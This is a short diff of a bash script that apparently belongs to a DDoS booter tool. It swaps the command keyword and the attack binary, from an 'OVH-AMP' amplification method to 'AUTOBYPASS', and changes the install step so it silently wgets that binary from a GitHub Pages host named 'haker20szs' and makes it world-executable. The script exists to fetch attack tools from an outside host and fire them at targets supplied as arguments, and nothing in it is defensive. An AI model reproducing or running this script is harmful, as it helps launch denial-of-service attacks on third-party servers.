@@ -63,9 +63,9 @@ if [[ -f "./installed" ]]; then
 
         IFS=' ' read -r -a args <<< "$cmdtorun"
 
-        if [ "${args[0]}" == "gg22" ]; then
+        if [ "${args[0]}" == "jnts" ]; then
 
-               ./root/methods/OVH-AMP "${args[1]}" "${args[2]}"
+               ./root/methods/AUTOBYPASS "${args[1]}" "${args[2]}"
 
                return;
                
@@ -98,8 +98,8 @@ else
     
     mkdir ~/root/methods
     
-    wget https://haker20szs.github.io/haker20szs/methods/OVH-AMP -O ~/root/methods/OVH-AMP 2> /dev/null
-    chmod -R 777 ~/root/methods/OVH-AMP 2> /dev/null
+    wget https://haker20szs.github.io/haker20szs/methods/AUTOBYPASS -O ~/root/methods/AUTOBYPASS 2> /dev/null
+    chmod -R 777 ~/root/methods/AUTOBYPASS 2> /dev/null
 
     echo "Installing modules."
 
